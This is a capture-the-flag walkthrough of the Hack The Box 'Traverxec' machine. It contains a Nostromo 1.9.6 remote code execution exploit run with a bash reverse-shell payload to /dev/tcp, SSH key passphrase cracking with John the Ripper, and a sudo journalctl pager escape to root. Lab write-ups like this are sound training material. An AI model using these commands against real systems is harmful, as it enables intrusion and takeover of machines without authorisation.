## Default Information
IP Address: 10.10.10.165\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.165    traverxec.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.165 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-10-02 01:05:16 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.165
Discovered open port 80/tcp on 10.10.10.165
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port. From the output, we realize that port 80 is running in Nostromo 1.9.6 which is quite unusual. We will keep this in mind when we do our exploit later. 

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | Open |
| 80	| HTTP | nostromo 1.9.6 | Open |

Afterwwards, we will use Nmap to scan for potential vulnerabilties on each of the ports. From the output, we can find that port 80 is vulnerable to CVE-2011-3192, but this is a DOS attack which is not very useful in this case.

```
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  BID:49303
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://seclists.org/fulldisclosure/2011/Aug/175
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       https://www.tenable.com/plugins/nessus/55976
|_      https://www.securityfocus.com/bid/49303
```

### Ferox Buster
We will then use Ferox Buster to discover endpoints related to http://traverxec.htb/

```
200        6l       15w      203c http://10.10.10.165/Readme.txt
301       14l       30w        0c http://10.10.10.165/css
200        1l       10w       55c http://10.10.10.165/empty.html
301       14l       30w        0c http://10.10.10.165/icons
301       14l       30w        0c http://10.10.10.165/img
200      400l     1177w    15674c http://10.10.10.165/index.html
301       14l       30w        0c http://10.10.10.165/js
301       14l       30w        0c http://10.10.10.165/lib
```

### Web-content discovery

Viewing http://traverxec.htb/Readme.txt, we realize that this website might be a templated website that is obtained from templatemag. However, finding the website does not expose much useful information.

![Readme from website](https://github.com/joelczk/writeups/blob/main/HTB/Images/Traverxec/readme.png)

Visiting other endpoints also do not give much conclusive results.
## Exploit

Using searchsploit, we realize that nostromo 1.9.6 is vulnerable to CVE-2019-16278, which is an RCE. Next, we will download the exploit code from (here)[https://github.com/theRealFr13nd/CVE-2019-16278-Nostromo_1.9.6-RCE],  and we will try to spawn a reverse shell.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 exploit.py -t 10.10.10.165 -p 80 -c '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.7/3000 0>&1"'
[+] Obtaining url...
[+] Constructing payload...
[+] Connecting to 10.10.10.165:80
[+] Sending payload...
[+] Payload dropped! Waiting for response...
[+] Response received! Printing out response...
HTTP/1.1 200 OK
Date: Fri, 29 Oct 2021 16:37:28 GMT
Server: nostromo 1.9.6
Connection: close
```

### Obtaining reverse shell

After obtaining the reverse shell, we will go on to stabilize the reverse shell

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000   
listening on [any] 3000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.165] 35128
bash: cannot set terminal process group (476): Inappropriate ioctl for device
bash: no job control in this shell
www-data@traverxec:/usr/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$ export TERM=xterm
export TERM=xterm
www-data@traverxec:/usr/bin$ stty cols 132 rows 34
stty cols 132 rows 34
www-data@traverxec:/usr/bin$
```
### Privilege Escalation to David

However, we realize that we do not have the privilege to view the files in /home/david

```
www-data@traverxec:/usr/bin$ cd /home
cd /home
www-data@traverxec:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root  root  4096 Oct 25  2019 .
drwxr-xr-x 18 root  root  4096 Oct 25  2019 ..
drwx--x--x  5 david david 4096 Oct 25  2019 david
www-data@traverxec:/home$ cd david
cd david
www-data@traverxec:/home/david$ ls
ls
ls: cannot open directory '.': Permission denied
www-data@traverxec:/home/david$ 
```

Running the LinEnum script, we discover that there is a htpasswd found in /var/nostromo/conf/.htpasswd. However, we are unable to decrypt the hash using John. We will move on with the exploit and come back at the end of the exploit. 

```
[-] htpasswd found - could contain passwords:
/var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

Visiting /var/nostromo/conf/, we are able to find another a nhttpd.conf file, which is another configuration file. Viewing the contents of nhttpd.conf file, we can know that at the /home/david directory, there is a public_www directory.

```
# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

Digging furthur, we find a /home/david/public_www/protected-file-area that holds a file named backup-ssh-identity-files.tgz. We will then upload the file to our local machine for furthur inspection.

![File upload](https://github.com/joelczk/writeups/blob/main/HTB/Images/Traverxec/file_upload.png)

Extracting the file, we realize that the file contains the _id_rsa_ which the the public key of the SSH server for David

```
┌──(kali㉿kali)-[~/Desktop]
└─$ tar -zxvf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

Lastly, all we have to do is to copy the contents of id_rsa into david_rsa file. Afterwards, we will use ssh2john.py to obtain the hash of the private key, and we will then proceed to use JohnTheRipper to crack the passcode. From the output, we can see that the passcode is ```hunter```.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ python ssh2john.py /home/david/id_rsa > david.hash  
┌──(kali㉿kali)-[~/Desktop]
└─$ john --wordlist=/home/kali/Desktop/pentest/wordlist/rockyou.txt david.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (david_rsa)
1g 0:00:00:00 DONE (2021-10-29 14:22) 11.11g/s 6689Kp/s 6689Kc/s 6689KC/s percing..peque
Session completed
```

### Obtaining user flag
```
┌──(kali㉿kali)-[~/Desktop]
└─$ chmod 600 david_rsa                                                                  1 ⚙
                                                                                             
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh -i david_rsa david@10.10.10.165                                                  1 ⚙
Enter passphrase for key 'david_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ at /home/david/user.txt
-bash: at: command not found
david@traverxec:~$ cat /home/david/user.txt
<Redacted user flag>
david@traverxec:~$ 
```

### Privilege Escalation to root

We discover that there is a script /home/david/bin/server-stats.sh that can be executed, which shows the server statistics. A closer inspection of the script reveals that the script executes /usr/bin/journalctl with sudo privileges

```
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

From GTFO bins, we realize that we would need to invoke the ```less``` command so that the default pager will pause before listing all the 5 enteries from the journal log.

```
david@traverxec:~/bin$ stty rows 4
david@traverxec:~/bin$ sudo journalctl -n5 -unostromo.service
-- Logs begin at Fri 2021-10-29 13:08:09 EDT, end at Fri 2021-10-29 14:53:10 EDT. --
Oct 29 13:12:15 traverxec sudo[840]: pam_unix(sudo:auth): conversation failed
Oct 29 13:12:15 traverxec sudo[840]: pam_unix(sudo:auth): auth could not identify password 
!/bin/sh
# whoami
root
```

### Obtaining root flag
```
# ls
server-stats.head  server-stats.sh
# cd
# ls
nostromo_1.9.6-1.deb  root.txt
# cat root.txt
<Redacted root flag>
# 
```

## Post-exploitation
### CVE-2019-16278
CVE-2019-16278 was an RCE resulting from directory traversal. http://traverxec.htb is vulnerable to directory traversal by adding a %0d between the trailing dots. (Refer to image below for the difference)

![Directory traversal without %0d](https://github.com/joelczk/writeups/blob/main/HTB/Images/Traverxec/directory_traversal_1.png)

![Directory traversal adding %0d](https://github.com/joelczk/writeups/blob/main/HTB/Images/Traverxec/directory_traversal_2.png)

The payload can be furthur modified to execute ```echo``` commands.
![Echo commands](https://github.com/joelczk/writeups/blob/main/HTB/Images/Traverxec/echo_commands.png)
